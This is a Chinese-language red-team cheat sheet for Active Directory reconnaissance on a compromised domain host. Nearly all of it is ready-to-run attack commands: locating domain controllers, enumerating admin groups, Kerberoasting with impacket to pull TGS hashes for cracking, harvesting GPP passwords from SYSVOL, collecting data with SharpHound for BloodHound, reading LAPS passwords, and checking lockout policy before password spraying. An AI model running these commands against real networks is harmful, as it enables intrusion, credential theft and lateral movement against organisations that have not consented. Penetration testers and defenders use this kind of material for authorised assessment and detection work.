# AD域信息收集速查

> 前提：已获得域内一台主机权限（域用户或本地管理员）。
> 流程：判断域环境 → 定位域控 → 枚举用户/组 → SPN扫描 → GPP凭据 → BloodHound → 域信任。

---

## §0 判断是否在域内

```cmd
echo %LOGONSERVER%
:: 域环境返回 \\DC01，工作组返回本机名

net time /domain
:: 域环境返回域控时间，工作组报错

net view /domain
:: 有域则列出域名列表

reg query "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Domain"
:: 域主机返回域名（如 redteam.com），工作组为空
```

---

## §1 定位域控

```cmd
nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN>
:: 返回SRV记录 = 域控IP

nltest /dclist:<DOMAIN>
:: 列出所有域控及站点

net group "Domain Controllers" /domain
:: 输出域控机器名列表

dsquery server -domain <DOMAIN>
:: 需RSAT，返回域控DN
```

---

## §2 用户/组枚举

```cmd
net user /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net group "Domain Computers" /domain

:: AdFind（免装RSAT，单exe带走）
AdFind.exe -b "DC=redteam,DC=com" -f "objectcategory=person" cn sAMAccountName
AdFind.exe -b "DC=redteam,DC=com" -f "admincount=1" cn distinguishedName

:: PowerShell（需RSAT）
Get-ADUser -Filter * -Properties SamAccountName | Select SamAccountName
Get-ADGroup -Filter * | Select Name
```

---

## §3 SPN扫描（Kerberoast前置）

```cmd
setspn -T <DOMAIN> -Q */*
:: 列出所有SPN，关注MSSQLSvc/HTTP/CIFS等高价值服务

:: impacket（从Linux攻击机）
GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request
:: 直接导出TGS-REP hash，丢hashcat跑
```

---

## §4 GPP凭据提取

```cmd
:: 手动检查SYSVOL
dir \\<DC>\SYSVOL\<DOMAIN>\Policies\ /s /b | findstr /i "groups.xml scheduledtasks.xml"
:: 找到xml后搜cpassword字段，gpp-decrypt解密

:: 自动化
shell Net-GPPPassword_dotNET_v2.exe <DOMAIN>
powershell Get-GPPPassword -Server <DC_IP> -Verbose
```

---

## §5 BloodHound

```cmd
:: 收集（域内任意用户即可）
SharpHound.exe -c all --domain <DOMAIN> --ldapusername <USER> --ldappassword <PASS>
:: 生成zip，导入Neo4j

:: 关键查询路径
:: - Find Shortest Paths to Domain Admins
:: - Find AS-REP Roastable Users
:: - Find Kerberoastable Users
:: - Shortest Path from Owned Principals
```

---

## §6 域信任关系

```cmd
nltest /domain_trusts /all_trusts
:: 列出所有信任关系及类型（双向/单向/林信任）

:: PowerShell
Get-ADTrust -Filter *
:: 返回信任方向、类型、是否传递

:: 信任方向决定跨域攻击路径
```

---

## §7 其他快速枚举

```cmd
:: DNS区域传送（碰运气）
nslookup -> server <DC_IP> -> set type=any -> ls -d <DOMAIN>

:: 密码策略
net accounts /domain
:: 关注锁定阈值和锁定时间，喷射前必看

:: LAPS密码（需权限）
Get-ADComputer -Filter * -Properties ms-mcs-AdmPwd | Where {$_."ms-mcs-AdmPwd"} | Select Name, ms-mcs-AdmPwd
```
